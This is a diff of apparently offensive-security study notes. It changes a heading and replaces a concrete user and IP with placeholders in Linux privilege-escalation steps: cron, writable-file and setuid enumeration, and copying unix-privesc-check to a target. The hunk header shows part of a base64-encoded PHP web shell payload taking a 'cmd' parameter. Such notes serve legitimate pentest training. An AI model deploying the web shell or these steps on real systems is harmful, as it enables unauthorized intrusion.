@@ -994,9 +994,9 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     List cron jobs: `ls -lah /etc/cron*` `crontab -l` `sudo crontab -l //root`  
     List writable directories: `find / -writable -type d 2>/dev/null` `find / -writable -type f 2>/dev/null`    
     setuid, segid: `find / -perm -u=s -type f 2>/dev/null`    
-  - **Automation - unix-privesc-check**
+  - 🖥️ **Automated Tool - unix-privesc-check**
     - Download from https://pentestmonkey.net/tools/audit/unix-privesc-check  
-    - `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.196.214:/home/joe`  
+    - `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check <user>@<target>:/home/joe`  
     - `joe@debian-privesc:~$ ./unix-privesc-check standard > unix-privesc-check.txt`  
     - Look for writable files "WARNING:"
     - Useful grep
